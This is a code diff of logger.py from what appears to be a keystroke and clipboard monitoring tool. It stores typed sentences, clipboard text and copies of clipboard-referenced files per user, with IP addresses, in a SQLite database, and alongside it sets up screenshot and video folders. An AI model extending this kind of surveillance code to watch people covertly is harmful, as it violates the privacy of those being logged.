@@ -1,3 +1,5 @@
+# logger.py
+
 import csv
 from datetime import datetime
 import os
@@ -22,7 +24,6 @@ def log_clipboard(data):
             user_dir, clipboard_dir, screenshot_dir, files_dir, video_dir = (
                 setup_user_directories(username)
             )
-            print(files_dir.encode("utf-8").decode())
 
             conn = sqlite3.connect(DB_FILE)
             c = conn.cursor()
@@ -34,13 +35,12 @@ def log_clipboard(data):
                             dest_path = os.path.join(
                                 files_dir, os.path.basename(file_path)
                             )
-                            print(files_dir.encode("unicode_escape").decode())
                             shutil.copy(file_path, dest_path)  # Copy the file to server
                             log_entry = f"Clipboard: copy path: {file_path}, paste path: {dest_path}"
 
                             c.execute(
-                                "INSERT INTO clipboard_logs (timestamp, username, ip, text) VALUES (?, ?, ?, ?)",
-                                (timestamp, username, ip, log_entry),
+                                "INSERT INTO clipboard_logs (timestamp, username, ip, text, type) VALUES (?, ?, ?, ?, ?)",
+                                (timestamp, username, ip, log_entry, "clipboard"),
                             )
                             print(f"Clipboard logged: {log_entry}")
                         except Exception as e:
@@ -65,8 +65,8 @@ def log_clipboard(data):
                         csv_writer.writerow([timestamp, username, ip, data])
 
                     c.execute(
-                        "INSERT INTO clipboard_logs (timestamp, username, ip, text) VALUES (?, ?, ?, ?)",
-                        (timestamp, username, ip, log_entry),
+                        "INSERT INTO clipboard_logs (timestamp, username, ip, text, type) VALUES (?, ?, ?, ?, ?)",
+                        (timestamp, username, ip, log_entry, "clipboard"),
                     )
                     print(f"Clipboard logged: {log_entry}")
                 except Exception as e:
@@ -81,23 +81,38 @@ def log_clipboard(data):
         print(f"Error logging clipboard data: {e}")
 
 
-# Test the function
-log_clipboard("Test clipboard text")
-
-
 def log_sentence(sentence):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     username = get_username()
     ip = get_ip()
-    log_entry = sentence
+
+    # Log entry with additional context for clipboard
+    if sentence.startswith("Clipboard : "):
+        log_entry = sentence
+    else:
+        log_entry = sentence
 
     conn = sqlite3.connect(DB_FILE)
     c = conn.cursor()
     c.execute(
-        "INSERT INTO logs (timestamp, username, ip, text) VALUES (?, ?, ?, ?)",
-        (timestamp, username, ip, log_entry),
+        "INSERT INTO logs (timestamp, username, ip, text, type) VALUES (?, ?, ?, ?, ?)",
+        (timestamp, username, ip, log_entry, "keystroke"),
     )
     conn.commit()
     conn.close()
 
     print(f"Keystroke logged: {sentence}")
+
+
+def log_all(data, log_type):
+    if log_type == "clipboard":
+        log_clipboard(data)
+    elif log_type == "keystroke":
+        log_sentence(data)
+    else:
+        raise ValueError("Invalid log type. Must be 'clipboard' or 'keystroke'.")
+
+
+# Example usage:
+log_all("Sample clipboard text", "clipboard")
+log_all("Sample keystroke text", "keystroke")
